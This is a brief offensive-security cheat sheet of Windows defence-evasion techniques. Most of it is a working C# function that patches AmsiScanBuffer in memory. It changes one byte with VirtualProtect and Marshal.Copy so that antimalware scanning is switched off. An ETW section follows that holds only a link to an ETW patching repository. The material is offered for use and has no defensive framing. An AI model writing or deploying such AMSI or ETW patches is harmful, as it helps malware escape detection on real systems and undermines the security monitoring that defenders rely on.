# Bypasses

## AMSI

### AMSI bypass via memory patching

```cpp
public static void PatchAmsi()
{
  IntPtr lib = LoadLibrary("amsi.dll");
  IntPtr amsi = GetProcAddress(lib, "AmsiScanBuffer");
  IntPtr final = IntPtr.Add(amsi, 0x95);
  uint old = 0;

  VirtualProtect(final, (UInt32)0x1, 0x40, out old);

  byte[] patch = new byte[] { 0x75 };
  Marshal.Copy(patch, 0, final, 1);

  VirtualProtect(final, (UInt32)0x1, old, out old);
}
```

## ETW

### usermode ETW patching

- <https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c>
